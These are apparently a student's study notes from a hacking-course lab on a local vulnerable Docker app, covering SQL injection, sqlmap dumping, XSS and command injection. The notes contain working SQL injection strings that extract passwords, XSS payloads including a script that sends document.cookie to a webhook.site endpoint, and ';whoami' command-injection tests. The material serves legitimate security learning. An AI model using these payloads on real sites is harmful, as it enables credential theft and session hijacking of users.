## Finding and Exploitation of common web vulnerabilities

### 🔵 PEH Docker lab setup and usage instructions:

    apt update
    apt upgrade
    apt install docker.io
    apt install docker-compose
if no running docker daemon then start it (assuming we have docker io / docker compose installed)

check status:  

    systemctl status docker  
start docker:  

    systemctl start docker (if required)
    docker-compose up
stop container:  

    ctrl c  
have docker run in the background use -d for detached mode:  
    
    docker-compose -d
to check what dockers are running:  
    
    docker ps -a  
to stop:

    docker-compose stop
to remove a container, look for container ID and remove:

    docker rm 02dfB1w20cdcd11ee
to remove all containers:

    docker -rm $(sudo docker ps -aq)

to reset the instance from browser when docker instances are live:

    localhost/init.php

#### Once PEH docker is installed, with ./permission.sh file set, run localhost from burpe browser.

---

### 🔴 SQL Injection - Introduction Injection 0x01:

#### Lab 0x01 UNION 

User search: jeremy presents username and email fields  
![image](https://github.com/user-attachments/assets/ff8b811f-0322-46f2-80f7-2bb05f3518b3)

When probing a new site, firstly understand what the function is providing. Begin by probing with common inputs ', ' ', example', " ", "example"  

Then move on to using **logical operators**  
jeremy' or 1=1#  
jeremy' or 1=1-- -  

if successful move to using **union select** and figuring out the amount of null values required to return a response  
jeremy' union select null#  
jeremy' union select null,null,null#  

the third null respondes with results, indicating it has selected three coloumns in the background, loaded more information but only presenting two for us to see.  
![image](https://github.com/user-attachments/assets/45806752-eb2c-4640-81ed-0ad1e6a8389b)

jeremy' union select null,null,version()#  
![image](https://github.com/user-attachments/assets/8f0e98a3-6470-461a-a92d-295c4392b99a)

**Expanding this to look at the table names from the database**  
jeremy' union select null,null,table_name from information_schema.tables#  

**Expand this to look at the collumn names from the database**  
jeremy' union select null,null,column_name from information_schema.columns#

**Now to look for Jeremys or other password from this database, we need to identify the table (injection0x01) his details belongs to using the tables query**  

jeremy' union select null,null,password from injection0x01#
![image](https://github.com/user-attachments/assets/2a90862c-613b-4c97-a679-ffd62e8710e4)

**Note for intergers, in siutations such as user has an ID - Rare, may need to look into this more**  
jeremy' union select null(int),null,null from injection0x01#  

for example we may require the usage below to work with some queries  
jeremy' union select username,1,passwords from injection0x01#  

**Cheat Sheet PortSwigger website for different SQL injection databases**  
<https://portswigger.net/web-security/sql-injection/cheat-sheet>  

---

### 🔴 SQL Injection - Blind Part 1 Injection 0x02:  

#### Lab 0x02 BLIND INJECTION  
Testing the behaviour of the application.  

* Target: adding the target url to reduce noise  
* Proxy/HTTP history: to view request and response  
* Repeater: send captured Request or Response traffic to view and manipulate. Items to look out for: Cookies, Content Length  

![image](https://github.com/user-attachments/assets/ce2c8585-3af9-41a2-aa8d-038d95f1e5ae)

#### Probe  
Here we attempt basic SQL changes in the POST:request data by probing the username section with url encoded jeremy' or 1=1# and testing it with other common formats, whilst also checking if the response content-length changes to a succesful one.  

#### SQLMAP (to help look for wins)  
After multiple failed attempts, we can move to a tool called sqlmap. From the clean Repeater:Request window with the working credentials. Copy and paste into a .txt file.  

![image](https://github.com/user-attachments/assets/d6f2b0f6-222b-476e-8e37-1886b81bcf91)  

    sqlmap -r sqltraining.txt

![image](https://github.com/user-attachments/assets/11632c30-c902-4740-9560-999972de3349)  

it looks like nothing from this captured POST request can be exploited based from these checks.

#### Check for other injections points  
After the POST:request is sent, we notice there is a GET:request containing cookies. This means it also has to be processed as well by the application. Taking note of the 'content length' of a successful Request, we can begin checking basic SQL injection queries with the cookie.  

![image](https://github.com/user-attachments/assets/88ab0d83-9b46-4846-ad32-86f7662fead8)

Here we have sucessfully manupilated the cookie section by injecting SQL into it, indicating this area is vulnerable.

### 🔴 SQL Injection - Blind Part 2 Injection 0x02: 

#### Lab 0x02 BLIND INJECTION  
We have now identified a Blind SQL injection, because the query is only changing the behaviour of the application. I.E the content-length or 'welcome' message when query is true. And through this we are able to exploit this behaviour to slowly extract data via True or False queries.  

#### 🔨 MANUAL Probe with SUBSTRING(string, start, length) <https://www.w3schools.com/jsref/jsref_substring.asp>  
From the manipulated query we can slowly extract data via adding substrings into the query. As seen below, 'a' is 1st of 1 length = 'a', if true it will return a positive content-length.
![image](https://github.com/user-attachments/assets/386375e9-3e35-4f88-9fd6-135b5c16d19a)  

'alex' is 1st of 3 length = 'ale'  
![image](https://github.com/user-attachments/assets/2e3add93-4bab-474c-9dfe-7d99f0313895)  

Extracting the SQL database version, by slowly iterating the length upwards as the version numbers match.  
![image](https://github.com/user-attachments/assets/7617e57e-4eef-47e3-a438-a549043a2d87)  

Exercise: Extracting the password for jessamy via blind injection is very manual, so therefore we will send it to Intruder to conduct a sniper attack  
![image](https://github.com/user-attachments/assets/fdb58a23-f339-4d8d-9b3d-8a7bda91eae3)  

Exercise: In intruder we have set our 'payload position' and custom payload configuration of strings to test in the selected position  
![image](https://github.com/user-attachments/assets/47ca1cae-0ace-49e9-8ad2-76d57c923110)  

Exercise: Here we find a unique length response paired with the Response recieved with a content-length:1027. Suggseting the character z exists. 
![image](https://github.com/user-attachments/assets/ab7bbb72-4b3f-4ffb-8057-3a38f20355c6)  

---

#### ⚒️ AUTOMATIC Probe with SQLMAP  

Grabbing the original GET request, we store it into a .txt file to be sacnned with 'sqlmap -r file.txt --level=2'  
![image](https://github.com/user-attachments/assets/6f72fcd0-2a69-4f8b-b2e5-df3518d3ad37)  

sqlmap -r file.txt --level=2> N encoding > Y Skip other payloads for other DBs Y > Y include level 1 and 2 risk one values > N Fuzzy test > N random integers > Y Null values > N other cookie sessions.  
![image](https://github.com/user-attachments/assets/85a05773-667b-4a59-988d-1948022b6f2b)  

sqlmap -r file.txt --level=2 --dump | identified md5 passwords hashes and performed a dictionary attack which cracked passwords from lab injection0x03 lol...  
![image](https://github.com/user-attachments/assets/0dff6d6c-e93e-4eb5-a0db-6757124a35ed)  

sqlmap -r file.txt --level=2 --dump -T injection0x02| for a faster -T scan of only the injection0x02 Table  
![image](https://github.com/user-attachments/assets/cf513f81-1da9-44ce-9869-6f8442000fae)  

---

### 🔴 SQL Injection - Challenge Injection 0x03:  
Table name examples: 
* injection0x03_products
* injection0x03_users

sucessfull content length: length25XX  
sucessfull content length: OR , AND 45XX  
unsuccessfull content length: 17XX  

basic SQL injection attack: Yes  
Senpai Knife Set' OR 1=1# / Senpai Knife Set' AND 1=1#  

basic UNION attack: Yes  
union works
Senpai Knife Set' union select null,null,null,null#  

Version discoverey: Yes  
version() 8.0.41
Senpai Knife Set' union select null,null,null,version()#  

Table List: Yes  
list tables:
Senpai Knife Set' union select null,null,null,table_name from information_schema.tables#  

Column list: Yes  
Senpai Knife Set' union select null,null,null,column_name from information_schema.columns#  

Found table named injection_0x03_users  
Password: Senpai Knife Set' union select null,null,null,password from injection0x03_users# | password: onigirigadaisuki  

Found username from injection_0x03_users  
Senpai Knife Set' union select null,null,null,username from injection0x03_users# | username: takeshi  

**problem solved.**  
**Personal Note:** finding the columns will determine what you can query in the tables.

Since we want to be more specific and we know the -T table we want:  
sqlmap -r sqltrain1.txt -T injection0x03_users --dump  

![image](https://github.com/user-attachments/assets/5e61d6f8-a8b3-40db-886f-705b923337f1)  

**Personal Note** ENSURE SYNTAX ARE ALL CORRECT / EVEN WHEN LEAVING OUT A SINGLE CHARACTER CAN MAKE THINGS NOT WORK.

---

## 🔵 XSS Introduction  
A flexible vulnerability, that allows us to execute typical javascript or sometimes html in a victim browsers and lets us take control of that application. There are three types:
1. Reflected - script is included in a http request, you send a script and a response is return with the script.
2. Stored - payload is sent to a DB where it is stored and retrieved later.
3. DOM-Based - everything happens locally on the client side browser, where there is vulnerable java script that uses untrusted inputs.

**The purpose of javascript is that it programs the behaviour of web pages. By adding interactivity and dynamic behaviour in real-time manipulation of both html and css.**  

### 🔴 XSS 0x01 DOM LAB
When conducted on local host and there is no network connections (http) being made, this is considered a DOM based attack.  

**Basic test** - will not trigger unless it was added to the page prior to loading.

    <script>prompt(1)</script>

**Triger test** triggers an error by loading an img=x where there is no x it throws an error, this error is used to load jscript.

    <img src=x onerror=prompt(1)>

**Windows.alert()**  
    
    <img src=x onerror=window.alert(888)>

**Windows.location.href**  

    <img src=x onerror=window.location.href='https://tcm-sec.com'>
    
---

### 🔴 XSS 0x02 STORED LAB  
In a stored XSS attack, malicious scripts are sent and stored in the DB and executed at a later time.  

[download firefox containers]  
[download firefox cookie-editor]  

**HTML Test** We should always test for html injection, as it is more likely to work. To validate if it is trully stored, we can check in a different instance (browser) and see if the injection has made its way and was stored in the DB.  
    
    <h1>test</h1>
    
**Test for basic JS XSS** In this we store two different prompts to be executed when the page is loaded.  

    <script>prompt(1)</script>
    <img src=x onerror=prompt(1)
    
**Storing document.cookie in DB**  

    <script>alert(document.cookie)</script>

---

### 🔴 XSS 0x03 - Challenge invoke admin cookie and exfil

**Test if Admin cookie can be called**

    <script>alert(document.cookie)</script>

**Using Fetch API function in jscript to invoke admin cookie and also exfiltrate to domain of choice, in this case a custom webhook** - found in portswigger <https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies>  

    <script>
    fetch('https://webhook.site/a338a82f-2cc3-47ea-ac8a-9c817c44bc8e', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>

![image](https://github.com/user-attachments/assets/b181e13e-efe5-4255-84dd-383253ed1136)

**Notes**  
initially i adopted to just grab the cookie presented from initial prompt and craft a secondary payload to POST cookie. However first payload is more efficient.

    <script>
    fetch('https://webhook.site/a338a82f-2cc3-47ea-ac8a-9c817c44bc8e', {
    method: 'POST',
    mode: 'no-cors',
    body:'cat323'
    });
    </script>

**Alternate version to invoke and exfil without using Fetch API function**  

    <script>
    var img = new Image();
    img.src = 'https://webhook.site/a338a82f-2cc3-47ea-ac8a-9c817c44bc8e?cookie=' + encodeURIComponent(document.cookie);
    </script>

---

## 🔵 Command injection - Introduction  
A Command Injection attack occurs when an attacker is able to inject and execute arbitrary commands on a system, typically on the server-side, via a vulnerable web application. These commands are typically executed by the underlying operating system. Exploitng vulnerabilities in an application's input validation mechanisms.  

### 🔴 Command Injection 0x01 - Basics  
using <https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection> we can start by testing for simple injections with special characters ;, &&, ||, and |. Test for injection within command arguments.

    google.com
    google.com; whoami
    ;whoami;asd

We can view page soucre for a better view. Now that we know this field is vulnerable to an injection attack using ; we should attempt a reverse shell  

**Search for python**
